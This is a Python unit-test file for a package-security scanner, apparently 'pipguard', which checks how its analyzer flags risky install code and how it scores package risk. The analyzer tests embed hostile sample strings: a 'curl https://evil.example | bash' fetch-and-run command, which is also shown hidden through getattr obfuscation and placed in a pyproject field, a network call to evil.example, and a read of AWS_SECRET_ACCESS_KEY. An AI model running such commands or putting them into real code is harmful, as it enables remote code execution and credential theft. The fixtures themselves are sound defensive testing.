import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

from pipguard import analyzer, cache, main, pypi, scorer


class AnalyzerTests(unittest.TestCase):
    def test_alias_subprocess_is_flagged(self):
        flags = analyzer._analyze_source(
            'from subprocess import Popen\nPopen(["sh", "-c", "echo pwned"])\n'
        )
        self.assertTrue(flags["shell_exec"])

    def test_env_subscript_and_home_env_are_flagged(self):
        env_flags = analyzer._analyze_source(
            'import os\nsecret = os.environ["AWS_SECRET_ACCESS_KEY"]\n'
        )
        self.assertTrue(env_flags["env_access"])

        home_flags = analyzer._analyze_source(
            'import os\nhome = os.environ["HOME"]\n'
        )
        self.assertTrue(home_flags["home_dir_access"])

    def test_network_alias_and_dynamic_import_are_flagged(self):
        network_flags = analyzer._analyze_source(
            'import urllib.request as u\nu.urlopen("http" + "://evil.example")\n'
        )
        self.assertTrue(network_flags["network_call"])

        dynamic_flags = analyzer._analyze_source(
            '__import__("os").system("echo pwned")\n'
        )
        self.assertTrue(dynamic_flags["dynamic_exec"])
        self.assertTrue(dynamic_flags["shell_exec"])

    def test_getattr_obfuscation_and_pyproject_scan_are_flagged(self):
        getattr_flags = analyzer._analyze_source(
            'import os\ngetattr(os, "sys" + "tem")("curl https://evil.example | bash")\n'
        )
        self.assertTrue(getattr_flags["dynamic_exec"])
        self.assertTrue(getattr_flags["shell_exec"])
        self.assertTrue(getattr_flags["network_call"])

        pyproject_flags = analyzer._analyze_pyproject(
            '[tool.example]\nbootstrap = "curl https://evil.example | bash"\n'
        )
        self.assertTrue(pyproject_flags["network_call"])
        self.assertTrue(pyproject_flags["shell_exec"])


class MainTests(unittest.TestCase):
    def test_split_pinned_package(self):
        self.assertEqual(
            main._split_pinned_package("urllib3==1.25.2", None),
            ("urllib3", "1.25.2"),
        )
        self.assertEqual(
            main._split_pinned_package("urllib3", "1.25.2"),
            ("urllib3", "1.25.2"),
        )


class CacheTests(unittest.TestCase):
    def test_clear_vuln_clears_cached_analysis_rows(self):
        original_dir = cache.CACHE_DIR
        original_db = cache.CACHE_DB

        with tempfile.TemporaryDirectory() as tmpdir:
            cache.CACHE_DIR = Path(tmpdir)
            cache.CACHE_DB = cache.CACHE_DIR / "cache.db"

            try:
                cache.set("full:requests:latest", {"ok": True}, cache.TTL_TRUST)
                cache.set("osv:requests:2.0.0", {"ok": True}, cache.TTL_TRUST)
                cache.clear_vuln()

                self.assertIsNone(cache.get("full:requests:latest"))
                self.assertIsNone(cache.get("osv:requests:2.0.0"))
            finally:
                cache.CACHE_DIR = original_dir
                cache.CACHE_DB = original_db


class PyPITests(unittest.TestCase):
    def test_compute_age_days_uses_earliest_release(self):
        releases = {
            "0.1.0": [{"upload_time": "2026-01-01T00:00:00"}],
            "0.2.0": [{"upload_time": "2026-01-03T00:00:00"}],
        }

        age_days = pypi._compute_age_days(
            releases,
            now=datetime(2026, 1, 10, tzinfo=timezone.utc),
        )

        self.assertEqual(age_days, 9)


class ScorerTests(unittest.TestCase):
    def test_dynamic_exec_adds_risk(self):
        breakdown = scorer.compute(
            {"age_days": 365, "github_url": "https://github.com/example/repo"},
            {"spike_pct": None, "last_month": 100000},
            [],
            {
                "network_call": False,
                "env_access": False,
                "home_dir_access": False,
                "shell_exec": False,
                "base64_obfuscation": False,
                "dynamic_exec": True,
            },
            "pure_python",
            "unknown",
        )

        self.assertEqual(breakdown["signals"]["Dynamic execution / obfuscation"], 40)
        self.assertEqual(breakdown["verdict"], "MEDIUM")


if __name__ == "__main__":
    unittest.main()
